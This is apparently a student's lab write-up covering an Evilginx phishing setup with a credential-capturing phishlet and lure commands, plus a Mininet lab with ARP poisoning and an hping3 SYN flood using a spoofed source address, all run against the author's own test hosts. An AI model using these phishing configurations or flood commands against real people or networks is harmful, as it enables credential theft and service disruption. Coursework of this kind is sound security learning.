# Lab and simulation environments in attacks

# A) Go Phish
### Task:
Familiarize yourself with the tool: **Evilginx** <https://github.com/kgretzky/evilginx2>     
Answer the following questions:
- How did you install the tool and what did you do with it?
- Were you succesfull in spoofing traffic?     

### Walkthrough
I installed the tool on my Kali-VM (the VM uses a bridged adapter, so that I can test it out in my own LAN).      

Install using:
```bash
$ sudo apt install evilginx2
```
- <img width="790" height="339" alt="Screenshot from 2025-11-23 22-54-42" src="https://github.com/user-attachments/assets/fd806af2-a535-4322-a8e5-c0b70777d464" />     

Launch by typing:
```bash
$ evilginx2
```
- <img width="994" height="612" alt="Screenshot from 2025-11-24 10-06-50" src="https://github.com/user-attachments/assets/ff14f7b3-09a2-4c9e-a96b-4fce0c6d1c90" />     
 
Set up domain and IP
```
: config domain safe-domain
```
```
: config ipv4 external <ip-of-my-vm-running-evilginx>
```
 - <img width="905" height="146" alt="Screenshot from 2025-11-24 10-25-51" src="https://github.com/user-attachments/assets/da088d8e-538b-44b7-9d0d-2050c77c433a" />

A simple config of `/etc/hosts` on the "victim" (host machine) will do the trick. 
- <img width="480" height="246" alt="Screenshot from 2025-11-24 18-32-38" src="https://github.com/user-attachments/assets/aa2d44ab-002a-43d9-afa8-7d951aab4d16" />


I asked chatGPT to make me a dummy login site for testing purposes.
### The dummy site works:
- <img width="1036" height="149" alt="Screenshot from 2025-11-24 22-04-44" src="https://github.com/user-attachments/assets/94dc1900-f76e-423b-a1a9-352ba2f436f3" />
- <img width="1226" height="421" alt="Screenshot from 2025-11-24 18-48-13" src="https://github.com/user-attachments/assets/091aa1d0-f20f-439a-94ab-5a92651047a5" />     


And this is the phishlet i'm using:
```bash
$ cat /usr/share/evilginx2/phishlets/dummy.yaml
```
**File:** `dummy.yaml`
```yaml
name: 'dummy'
author: 'aliG'
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: ''
    domain: 'safe-domain.com'
    session: true
    is_landing: true
    auto_filter: true

sub_filters:
  - phish_sub: 'login'
    orig_sub: ''
    triggers_on: 'login'
    domain: 'safe-domain.com'
    mimes: ['text/html', 'application/json', 'text/plain']
    search: 'safe-domain.com'
    replace: 'login.safe-domain.com'

auth_tokens:
  - name: 'sessionid'
    domain: 'safe-domain.com'
    path: '/'
    keys: ['sessionid']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'safe-domain.com'
  path: '/login'
```
     
Configure hostname for phishlet and enable it:
```
: phishlets hostname instagram safe-domain.com
: phishlets enable instagram
```
Generate lure and get the link:
```
: lures create instagram
: lures get-url <id>
```


## But does the attack work?
I had some issues getting this to work with my snakeoil cert. (Writing this from the **future:** it was a very simple fix you will see in part two 😂)
- <img width="1184" height="509" alt="Screenshot from 2025-11-24 18-51-32" src="https://github.com/user-attachments/assets/2255015f-e149-4e9c-b64e-358edd7a57c5" />

## Execution:
- <img width="758" height="368" alt="Screenshot from 2025-11-24 22-15-52" src="https://github.com/user-attachments/assets/cb6395aa-078b-46b2-b3a3-5c1ff66980af" />
- But no, keeps timing out...
  - <img width="1129" height="651" alt="Screenshot from 2025-11-24 22-18-27" src="https://github.com/user-attachments/assets/0bebf411-e434-42af-815e-c918c9dd29e7" />
- There's definitively something here i'm not seeing.
- Unfortunately, in order to resolve the issue I would need more time, which I don't at the moment. :/
- Will have to return!     
 

### Conclusion:
- This task was a fail for me, I will try to get it to work later.
- But it is what it is, we live and we learn!   



# Go Phish Part 2 (this is later)
**Starting over**     
> In developer mode (used for testing purposes locally):       
- <img width="1052" height="608" alt="Screenshot from 2025-12-02 10-59-35" src="https://github.com/user-attachments/assets/421f3181-9f44-40d0-a9a8-27e24d9c11d2" />     

#### Configure the domain and IP:

#### Using a phishlet I found online:
- Authors github repo: <https://github.com/webdevvx/evilginx-phishlets/tree/main>
- The phishlet: <https://github.com/webdevvx/evilginx-phishlets/blob/main/instagram.yaml>     

#### Set phishlet hostname && enable:
- <img width="904" height="306" alt="Screenshot from 2025-12-02 16-38-17" src="https://github.com/user-attachments/assets/7f8e207c-ca89-48c0-8e77-ab24e3d54698" />    

#### Create lure:
- <img width="418" height="52" alt="Screenshot from 2025-12-02 16-39-01" src="https://github.com/user-attachments/assets/2ebc4ab1-42a6-4c7d-972a-09885b228498" />

#### Generate ssl-snakeoil crt
```
sudo make-ssl-cert generate-default-snakeoil
```

#### cp cert to -> `~/.evilginx/crt/sites/*`
- <img width="433" height="81" alt="Screenshot from 2025-12-02 17-05-30" src="https://github.com/user-attachments/assets/684e4da4-817c-4a04-955d-d553d3e218a7" />     

#### Disable LetsEncrypt:     
> This is the key piece that was missing before. (I had the old certs straight under `/crt`)     
> Found it randomly on a twitter post made by the author of the tool, while googling for solutions on the bus.     
> Took a screenshot of it and a week later it's exactly what I needed. 😂             
```
 : config autocert off
```

- This is the post I found:
  - <img width="1170" height="2532" alt="IMG_8600" src="https://github.com/user-attachments/assets/253b0919-4f21-452a-8e98-1266b8897b48" />


Through the *phishlets help menu*,      
I was provided with two subdomains to add to my `/etc/hosts` file:
- <img width="682" height="155" alt="Screenshot from 2025-12-02 17-16-31" src="https://github.com/user-attachments/assets/7e1e3432-7b0b-4463-a4f4-2218d7a8e164" />     

I then *disabled the phishlet* -> *Rebooted the machine* ->      
*Fired up evilginx* -> *Enabled the phishlet* -> *Created a new lure* -> *Pasted the link in my browser*:
- <img width="1030" height="616" alt="Screenshot from 2025-12-02 17-39-04" src="https://github.com/user-attachments/assets/6e6ff3ff-c5d9-4cf4-a04f-7d41f0dc6d19" />     

<img width="300" height="70" alt="Screenshot from 2025-12-02 17-39-23" src="https://github.com/user-attachments/assets/b7c3f809-2563-46e8-aa0e-75347c207e0b" />     

- <img width="1150" height="678" alt="Screenshot from 2025-12-02 17-39-55" src="https://github.com/user-attachments/assets/1f8a3b3e-dca0-41b6-9e03-b28b4c386759" />

#### Now that we're finally able to demonstrate that it works, might as well try another phishlet.     
> Here's one I found on github as well: <https://github.com/rencora/evilginx3-phishlet-templates/blob/main/Linkedin.yaml>      

#### Enable it:
- <img width="727" height="281" alt="Screenshot from 2025-12-02 17-52-03" src="https://github.com/user-attachments/assets/a6c23944-4a88-4d3e-a8c6-c8827a3b6da7" />     

#### Login page:
- <img width="1147" height="670" alt="Screenshot from 2025-12-02 17-49-19" src="https://github.com/user-attachments/assets/9168fa5e-77c4-48bb-9449-444493df930b" />     

### Type in credentials to log in...     

#### Attack succesful, the fool fell for it
The console is delivering the credentials in real time =>     
<img width="624" height="72" alt="Screenshot from 2025-12-02 17-53-42" src="https://github.com/user-attachments/assets/7d6bb359-e475-4b5f-8dc0-b614c6a69a42" />      

### Conclusion (part 2)
- In hindsight, I think the biggest issues I had in `part 1` was the
  - ... TLS.
  - ... connection between proxy & dummy-app.
  - And
  - .. phishlet not working as intended.
- When I tried again:
  - Finally got my snakeoil cert to work and used a ready made phishlet.
- In the end, we successfully launched and executed a phishing attack using evilginx, and in the process of doing so, aquired login credentials to a website.
- I now know the basics of how phishing works behind the curtains.
- Next step would be to buy a domain, set up a server in the cloud and start phishing for banking credentials!     

For legal reasons, the public record, and whom it may concern:     
*I hereby solemnly swear, that the aforementioned statement, in its entirety: was nothing less of fully, completely, and irrevocably just a joke! And not to be taken seriously in any way shape or form!*

# B) Mininet
# Create an environment, where you can do a TCP SYN-flood attack. Report on how you created the environment and executed the attack
Setting it up:
- **Download image**
  - Link provided by teacher
  - You can download it from here: <https://mininet.org/download/>
- **Import it to VBox**
  - <img width="954" height="573" alt="Screenshot from 2025-11-24 22-45-12" src="https://github.com/user-attachments/assets/6b6e8fc6-ca7f-415a-965b-167e68469712" />
- **Create host-only adapter**
  - <img width="591" height="174" alt="Screenshot from 2025-12-01 20-44-43" src="https://github.com/user-attachments/assets/a6bd3c0b-f52d-4654-90b7-8f7627773421" />
- **Attach to VM (first adapter is NAT)**
  - <img width="639" height="168" alt="Screenshot from 2025-12-01 20-45-19" src="https://github.com/user-attachments/assets/95016eae-c82a-4e83-adb5-f051ddfdb496" />
- **Start machine**
- **First order of business:** `sudo loadkeys fi`
- Get the IP address of the eth0 interface:
  - <img width="792" height="68" alt="Screenshot from 2025-12-01 21-35-55" src="https://github.com/user-attachments/assets/dd2e8586-dd04-4d39-8f67-1fa9e36c0e9c" />    

Now that the key map is all proper and nice, and we have the IP, we can get down to actual business.
```
ryu-manager ryu.app.simple_switch_13
```
This effectively starts the controller.    
<img width="642" height="113" alt="image" src="https://github.com/user-attachments/assets/d8c8ea8a-e6e5-49c0-ab7f-de9ad0efd689" />

### Ryu?
- A quick "google search" (the AI summary at the top of the page because I felt lazy) tells us, that `ryu-manager` is used to manage ryu applications, which are really just tools used in SDN (Software Defined Networking).
- Ryu in itself "is a component-based SDN framework"
- Source: <https://ryu-sdn.org/>

Anyway, when the controller is on, we can ssh into the VM && start the environment using the command:
```bash
sudo mn --topo single,3 --mac --switch ovsk --controller remote
```
<img width="1222" height="441" alt="Screenshot from 2025-12-01 21-41-13" src="https://github.com/user-attachments/assets/924d2244-0d23-47b5-9f24-9e2faef0322c" />     

### The command shortly:
- `mn` = MiniNet
- `--topo single,3` = Single topology, 3 hosts
- `--mac` = Tells mininet to use unique, small & easy to read addressing (mac & ip)
- `--switch ovsk` = Switch type: Open vSwitch
- `--controller remote` =
  - This could also be started as `sudo mn --controller,ryu.app.simple_switch_13`    
  - But because we started it already, we are effectively using it as a **remote** controller, and in this command telling mininet to use it.

### Testing connectivity
```
mininet> pingall
```
- <img width="1477" height="219" alt="Screenshot from 2025-12-01 21-46-13" src="https://github.com/user-attachments/assets/9fcd3fe2-05da-44e2-89c0-69d35a30f29a" />     
- A working mininet environment is up and running.
- We can even see the activity from the controller output on the right!     

Xterm was giving me some problems tho, so I ran the commands provided by the professor Mr. Iso-Anttila
- <img width="1238" height="125" alt="Screenshot from 2025-12-01 21-51-39" src="https://github.com/user-attachments/assets/3700159a-e0e7-434e-a840-f2a14322ebfc" />

- **Thank you Lari!**

### ARP poisoning
I started by warming up, and was still using training wheels, meaning I completed the guided ARP poisoning exercise.     
It was a very interesting task.    
We ran a few commands and started the `arp_poison.py` in the background:
- On H3
  - <img width="489" height="201" alt="ARP-poisoning-SSH-honeypot" src="https://github.com/user-attachments/assets/408efeeb-24c9-422b-a89b-de5181ca0d15" />
- Listening in
  - <img width="484" height="120" alt="Screenshot from 2025-12-01 22-02-21" src="https://github.com/user-attachments/assets/d8c3c178-7ab0-4ada-857e-0722a5f49b83" />
  - <img width="522" height="369" alt="Screenshot from 2025-12-01 22-01-15" src="https://github.com/user-attachments/assets/e0c1f346-a12c-4e57-8db7-31269fc8290e" />
- When connecting from H1 to --> H2 using SSH:
  - <img width="522" height="369" alt="Screenshot from 2025-12-01 22-01-15" src="https://github.com/user-attachments/assets/81202498-1212-46f0-a54f-48ec320ed5b8" />
  - The warning sign is giving our poison away, but it still worked.
- trainingWheelsProtocol completed, we can now move on to the main course --->     


## TCP SYN-Flood attack
> The environment is already up and running. Let's get cracking!     
 
**Using node 3 as the attack machine.**              
**H1 will work as the victim:**
- <img width="493" height="130" alt="Screenshot from 2025-12-01 23-05-09" src="https://github.com/user-attachments/assets/6584aae1-5f43-410a-b6dd-d61460f6a230" />     

Download nmap and see what we're working with:
```
nmap -sn 10.0.0.0/24
```
<img width="422" height="161" alt="Screenshot from 2025-12-01 22-58-19" src="https://github.com/user-attachments/assets/04b8ba97-9499-4e1d-af49-3c47bc34fd5d" />     

`Host 10.0.0.1` is up, let's figure out an entry point:
```
nmap -sS 10.0.0.1
```
<img width="427" height="138" alt="Screenshot from 2025-12-01 23-05-47" src="https://github.com/user-attachments/assets/a6c637d3-1971-4768-a908-f22404beaaf0" />     

### Target aquired (port 80 is open), time to execute the attack.    
Found a script online to use: <https://gist.github.com/ankur8931/df0fde848afa0a8f226e4fcbafc02952>     
Added it to my arsenal:
- <img width="1211" height="135" alt="Screenshot from 2025-12-01 22-25-05" src="https://github.com/user-attachments/assets/343ca38d-1b69-41ab-9cb0-c847c6ff1c5b" />      

Only thing left was to specify which interface plus target to use:
- <img width="283" height="71" alt="Screenshot from 2025-12-01 23-07-22" src="https://github.com/user-attachments/assets/4035b069-e751-489b-9bff-9ea7d0867160" />
- <img width="426" height="31" alt="Screenshot from 2025-12-01 23-29-48" src="https://github.com/user-attachments/assets/aa2614d2-c782-490b-b366-2df3c47968db" />     

There was only one problem tho:
- <img width="1122" height="313" alt="Screenshot from 2025-12-01 23-29-08" src="https://github.com/user-attachments/assets/4910c88d-b994-4b5c-bcb4-216676b64ff8" />      

*20,000 packets in 30 seconds*? I must've done something wrong, as this was simply not going to cut it for us.     
So I did some soul searching online, and found a pretty hefty utility called `hping3`     

## HPING3 For The Win!
The man pages came to my aid once again, as I was figuring out this little utility.     
After a few test runs, I finally carved out the big gun.     
Let me present to you:
```
hping3 -S --spoof 8.8.8.8 --flood -p 80 10.0.0.1
```
**Quick rundown:**
- `-S` = sets tcp SYN flag
- `--spoof <IP>` = well... spoofs an ip address innit
- `--flood` = well... floods the gates innit xd
- `-p 80` port 80 to attack (the one nmap so kindly delivered to us)
- Last portion is the poor host we're going to demolish

This time around, it actually delivered:
<img width="500" height="95" alt="Screenshot from 2025-12-01 23-47-15" src="https://github.com/user-attachments/assets/8ce1da9a-52b3-4168-af14-234464559edb" />     
<img width="1239" height="388" alt="Screenshot from 2025-12-01 23-47-48" src="https://github.com/user-attachments/assets/e6f817b3-788d-46ea-959f-ac647052895e" />      

A whopping **1,2 million** packets in **8 seconds**.      
Hping really came through, and this mission is accomplished in my books.
At least my controller thought so 😂:
- <img width="981" height="44" alt="Screenshot from 2025-12-01 23-45-50" src="https://github.com/user-attachments/assets/3514e0bc-9c02-43fa-9182-932ce60a498a" />

Having completed the lab, time to clean up and say bye bye! 🖐️
```
sudo mn -c
```
<img width="1244" height="176" alt="Screenshot from 2025-12-01 23-51-17" src="https://github.com/user-attachments/assets/6ea19b39-44d7-440a-943d-aad33702b321" />
